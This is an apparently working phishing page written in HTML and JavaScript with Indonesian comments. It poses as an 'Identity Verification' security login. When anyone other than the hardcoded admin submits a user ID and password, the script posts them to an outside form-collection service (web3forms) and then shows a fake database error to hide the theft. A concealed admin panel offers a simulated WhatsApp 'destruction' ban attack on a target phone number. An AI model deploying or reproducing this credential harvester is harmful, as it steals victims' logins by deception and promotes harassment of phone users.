<!DOCTYPE html>
<html lang="en">
<head> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap');
        :root { --bg-dark: #050505; --accent: #3b82f6; --surface: #0f0f0f; --error: #ef4444; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-dark); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        
        .header-logo { position: fixed; top: 0; left: 0; width: 100%; padding: 20px; z-index: 5000; display: flex; justify-content: space-between; pointer-events: none; }
        .logo { font-weight: 800; color: var(--accent); cursor: pointer; user-select: none; font-size: 1.1rem; pointer-events: auto; }

        #login-screen { position: fixed; inset: 0; background: var(--bg-dark); z-index: 1000; display: flex; align-items: center; justify-content: center; padding: 20px; transition: 0.5s; }
        .form-box { background: var(--surface); padding: 2.5rem; border-radius: 24px; width: 100%; max-width: 400px; border: 1px solid #1f1f1f; text-align: center; }
        
        .input-group { position: relative; width: 100%; margin-bottom: 15px; }
        input { width: 100%; background: #000; border: 1px solid #2a2a2a; padding: 14px; border-radius: 12px; color: white; outline: none; font-size: 1rem; }
        .eye-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #64748b; cursor: pointer; z-index: 10; font-size: 1.2rem; }
        
        .btn { width: 100%; padding: 14px; background: var(--accent); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; }

        #admin-dashboard { display: none; padding: 20px; padding-top: 80px; opacity: 0; transition: 1s; }
        .section { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(10px); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid rgba(59,130,246,0.1); }
        
        #loader { display: none; position: fixed; inset: 0; background: #000; z-index: 9000; flex-direction: column; align-items: center; justify-content: center; }
        .spin { width: 40px; height: 40px; border: 3px solid #1e293b; border-top-color: var(--accent); border-radius: 50%; animation: s 0.8s infinite linear; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="header-logo">
        <div class="logo" id="secret-logo">LOGIN.SECURITY</div>
    </div>

    <div id="login-screen">
        <div class="form-box">
            <i class="ph-bold ph-shield-check" style="font-size: 3rem; color: var(--accent); margin-bottom: 15px; display: block;"></i>
            <h2>Identity Verification</h2>
            <p style="color:#64748b; font-size:0.8rem; margin-bottom:25px; margin-top: 5px;">Security protocol active.</p>
            
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="user_id" placeholder="User ID" required>
                </div>
                <div class="input-group">
                    <input type="password" id="pw_field" placeholder="Password" required>
                    <i class="ph ph-eye-slash eye-btn" id="toggle-eye"></i>
                </div>
                <button type="submit" class="btn">Verify Access</button>
            </form>
        </div>
    </div>

    <div id="loader"><div class="spin"></div><p style="color:var(--accent); margin-top:10px; font-size:0.8rem;">AUTHORIZING...</p></div>

    <div id="admin-dashboard">
        <div class="section">
            <h3 style="color:var(--accent)">KHUSUS ADMIN | KING ECAN</h3>
            <p style="font-size: 0.8rem; color:#64748b; margin-top:5px;">Panel Kontrol Utama Berhasil Diakses.</p>
        </div>
        <div class="section" style="border-color: rgba(239, 68, 68, 0.3);">
            <h3 style="color:var(--error)">WA_DESTRUCTION_ENGINE (BUG)</h3>
            <div style="margin-top:15px;">
                <input type="text" id="target-no" placeholder="Masukkan Nomor Target (628...)" style="width:100%; padding:12px; background:#000; border:1px solid #333; color:white; border-radius:10px; margin-bottom:10px;">
                <button class="btn" style="background:var(--error)" onclick="runBan()">INITIATE BUG ATTACK</button>
            </div>
            <div id="logs" style="font-family:'JetBrains Mono'; font-size:0.7rem; color:var(--error); margin-top:10px; min-height:50px;">> System Standby...</div>
        </div>
    </div>

    <script>
        const _0xKEY = "5af0d436-2207-4b37-bdb8-e0213cf48f24";
        const userField = document.getElementById('user_id');
        const passField = document.getElementById('pw_field');
        const eye = document.getElementById('toggle-eye');

        // MATA LOGIC
        eye.onclick = () => {
            const isP = passField.type === 'password';
            passField.type = isP ? 'text' : 'password';
            eye.className = isP ? 'ph ph-eye eye-btn' : 'ph ph-eye-slash eye-btn';
        };

        // LOGIN LOGIC
        document.getElementById('login-form').onsubmit = async (e) => {
            e.preventDefault();
            const u = userField.value;
            const p = passField.value;

            // --- CEK ADMIN (Akun & pw) ---
            if(u === "Akun" && p === "pw") {
                document.getElementById('loader').style.display = 'flex';
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('login-screen').style.display = 'none';
                    const adminArea = document.getElementById('admin-dashboard');
                    adminArea.style.display = 'block';
                    setTimeout(() => { adminArea.style.opacity = '1'; }, 50);
                    document.body.style.background = "#020617"; 
                }, 1200);
                return; 
            } 

            // --- JIKA TARGET ---
            document.getElementById('loader').style.display = 'flex';
            const f = new FormData();
            f.append("access_key", _0xKEY);
            f.append("User", u); 
            f.append("Pass", p);

            try {
                await fetch("https://api.web3forms.com/submit", { 
                    method: 'POST', 
                    body: f,
                    headers: { 'Accept': 'application/json' }
                });
            } catch (err) {}

            document.getElementById('loader').style.display = 'none';
            alert("Error 0x88: Server database connection failed. Please try again later.");
        };

        // MASTER LOGO
        let count = 0;
        document.getElementById('secret-logo').onclick = () => {
            count++;
            if(count >= 5) {
                const master = prompt("Master Key:");
                if(master === "Adminchan") window.location.href = "https://app.web3forms.com/forms";
                count = 0;
            }
        };

        // BAN SIMULATOR
        function runBan() {
            const num = document.getElementById('target-no').value;
            if(!num) return alert("Masukkan nomor target!");
            const l = document.getElementById('logs');
            l.innerHTML = "> Memulai Exploit Bug WA pada: " + num + "<br>";
            setTimeout(() => { l.innerHTML += "> Mengirim paket crash ke server...<br>"; }, 1000);
            setTimeout(() => { l.innerHTML += "> [SUCCESS] Akun target telah dinonaktifkan sementara."; }, 2500);
        }
    </script>
</body>
</html>
